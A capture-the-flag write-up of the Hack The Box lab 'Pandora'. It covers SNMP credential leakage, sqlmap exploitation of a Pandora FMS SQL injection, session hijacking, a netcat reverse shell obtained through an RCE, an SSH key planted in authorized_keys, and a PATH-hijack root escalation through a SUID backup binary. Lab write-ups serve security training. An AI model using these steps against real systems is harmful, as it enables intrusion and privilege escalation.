# Pandora - Easy

Target IP: **10.129.67.73**

## User Flag

Initial scan: ```sudo -sC -sV 10.129.67.73 -v```

Output shows standard port 22 for ssh and port 80 running Apache 2.4.41.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's navigate to the website. We are greeted with this. It mentions ```panda.htb```, so let's add it to our ```/etc/hosts``` file.

![1](Screenshots/P_1.jpg)

Nothing on the website seems directly interesting, so let's perform some extra enumeration.

I performed directory and subdomain enumeration, but to my surprise, nothing useful came back. Perhaps we're missing something.

Let's try enumerating the UDP ports on the remote machine.

```
┌──(y㉿peacebreaker)-[~]
└─$ sudo nmap -sU --top-ports 100 10.129.67.73 -v
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-22 22:42 -0400
Initiating Ping Scan at 22:42
Scanning 10.129.67.73 [4 ports]
Completed Ping Scan at 22:42, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:42
Completed Parallel DNS resolution of 1 host. at 22:42, 0.50s elapsed
Initiating UDP Scan at 22:42
Scanning 10.129.67.73 [100 ports]
Discovered open port 161/udp on 10.129.67.73
Increasing send delay for 10.129.67.73 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.129.67.73 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.129.67.73 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.129.67.73 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.129.67.73 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
UDP Scan Timing: About 35.11% done; ETC: 22:43 (0:00:57 remaining)
UDP Scan Timing: About 62.89% done; ETC: 22:43 (0:00:36 remaining)
Completed UDP Scan at 22:43, 108.51s elapsed (100 total ports)
Nmap scan report for 10.129.67.73
Host is up (0.012s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 109.13 seconds
           Raw packets sent: 240 (13.821KB) | Rcvd: 114 (9.348KB)
```

We get an interesting result, port 161 is open for SNMP. Let's dig deeper into this.

A version scan reveals that it is snmp v1.

```
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
```

Let's use ```snmpwalk``` to enumerate this. We can try with the default community string ```public```.

```
snmpwalk -v 1 -c public 10.129.67.73 >> snmpwalk.results
```

Looking at the results, we find a set of credentials.

```
iso.3.6.1.2.1.25.4.2.1.5.957 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
```

Let's try to log in as ```daniel``` through ssh.

We're in!

```
daniel@pandora:~$ whoami
daniel
```

However, the user flag in sitting in the ```matt``` user's home directory, so we need to find a vector for lateral movement.

Looking at the Apache configuration, there is a web server being hosted on localhost port 80.

```
daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

Let's perform local port forwarding to access the internally exposed port 80 on the remote network.

```
ssh -L 9001:localhost:80 daniel@10.129.67.73
```

Now, navigating to ```http://localhost:9001``` leads us to this log in page.

![2](Screenshots/P_2.jpg).

We see on the bottom of the site that it is running "v7.0NG.742_FIX_PERL2020". Let's look for any publicly disclosed vulnerabilities.

Apparently this is vulnerable CVE-2021-32099, an unauthenticated SQLi vulnerability through the session_id parameter.

Let's feed this into sqlmap.

It worked, there was a database named pandora, and inside a table named tsessions_php, we can see a session id for matt.

```
Database: pandora
Table: tsessions_php
[50 entries]
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
| 5osdp57ihgeo32gm625cnco620 | NULL                                                | 1790134544  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 9o78ckiqpg5deu7kv48hhjjqha | NULL                                                | 1790135051  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| apt2168egm4mo6kb4ar384kbt4 | id_usuario|s:6:"daniel";                            | 1790086696  |
| ba6npcep72u110oej58cequ2j8 | NULL                                                | 1790134595  |
| bbhf4mtod74tqhv50mpdvu4lj5 | id_usuario|s:6:"daniel";                            | 1641201982  |
| bukku5negcgln20o41qp7sf0t6 | NULL                                                | 1790135135  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
```

Let's replace the session value with Matt's and see if we can log in.

It worked!

![3](Screenshots/P_3.jpg)

There was another CVE that I saw that didn't quite apply to the previous scenario, but one that we could leverage now. CVE-2020-13851 is an RCE vulnerability that exploits the Events feature.

We can capture one of the requests sent by navigating to an Events feature and put this payload in.

![4](Screenshots/P_4.jpg)

The response hangs, which is a good sign.

We get a shell back as ```matt```.

```
┌──(y㉿peacebreaker)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.68] from (UNKNOWN) [10.129.67.73] 59122
bash: cannot set terminal process group (7159): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console$ whoami
whoami
matt
```

We can proceed to get the user flag from here.

## Root Flag

There is an interesting binary with the SUID bit set, ```pandora_backup```.

```
matt@pandora:/home/matt$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

Running it tells us that we are lacking permissions even though the binary has the SUID bit set.

```
matt@pandora:/var/www/pandora/pandora_console$ pandora_backup 
pandora_backup
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup failed!
Check your permissions!
```

We must be in a restricted shell environment. Let's generate a ssh key pair and place our public key in ```matt```'s home directory and use the private key to log in.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Pandora]
└─$ ssh-keygen -t ed25519 -C y@peacebreaker.com
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/y/.ssh/id_ed25519): /home/y/Labs/HackTheBox/Pandora/key/id_ed25519
Enter passphrase for "/home/y/Labs/HackTheBox/Pandora/key/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/y/Labs/HackTheBox/Pandora/key/id_ed25519
Your public key has been saved in /home/y/Labs/HackTheBox/Pandora/key/id_ed25519.pub
The key fingerprint is:
SHA256:ECsvj11RBGkNg4MF7G8ovi7e1V+4XKQ0DbM6Azy6zZU y@peacebreaker.com
The key's randomart image is:
+--[ED25519 256]--+
|   ..+o.+*o      |
|    o oooo.      |
|   .. oo.o       |
|    oo . .=      |
|    .*. S+ o     |
|  . o=*.+ =      |
| . o.ooE o o     |
|. o = . = +      |
|.+o+ o   +       |
+----[SHA256]-----+
                                                                                                                                                                        
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Pandora]
└─$ cd key                           
                                                                                                                                                                        
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Pandora/key]
└─$ cat id_ed25519            
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC0p37hi55XAcCIo9y4LbWSqGPi4ZG76z6HdzF1U4vS+AAAAJj/MST//zEk
/wAAAAtzc2gtZWQyNTUxOQAAACC0p37hi55XAcCIo9y4LbWSqGPi4ZG76z6HdzF1U4vS+A
AAAEAZQsVuEakTmpy3Ca0kRv+sdvmSbWIUFKWTSWxaCt5JvrSnfuGLnlcBwIij3LgttZKo
Y+LhkbvrPod3MXVTi9L4AAAAEnlAcGVhY2VicmVha2VyLmNvbQECAw==
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                                                        
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Pandora/key]
└─$ ls
id_ed25519  id_ed25519.pub
                                                                                                                                                                        
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Pandora/key]
└─$ cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILSnfuGLnlcBwIij3LgttZKoY+LhkbvrPod3MXVTi9L4 y@peacebreaker.com
```

```
matt@pandora:/home/matt/.ssh$ echo -n 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILSnfuGLnlcBwIij3LgttZKoY+LhkbvrPod3MXVTi9L4 y@peacebreaker.com' > authorized_keys
<rPod3MXVTi9L4 y@peacebreaker.com' > authorized_keys
```

Finally, using our private key to log in, we get a shell as ```matt```.

```
matt@pandora:~$ whoami
matt
```

Running ```ltrace``` on the binary reveals that ```tar``` is called without an absolute path, so we might be able to hijack the PATH can get a reverse shell as root.

```
matt@pandora:~$ ltrace pandora_backup
getuid()                                                                                                = 1000
geteuid()                                                                                               = 1000
setreuid(1000, 1000)                                                                                    = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                                                                       = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)                                                             = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                  = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
)                                                            = 39
+++ exited (status 1) +++
```

Let's try it.

```
matt@pandora:~$ export PATH=/tmp:$PATH
matt@pandora:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/tmp$ nano tar
matt@pandora:/tmp$ cat tar
#!/bin/bash

/bin/bash
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp# whoami
root
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
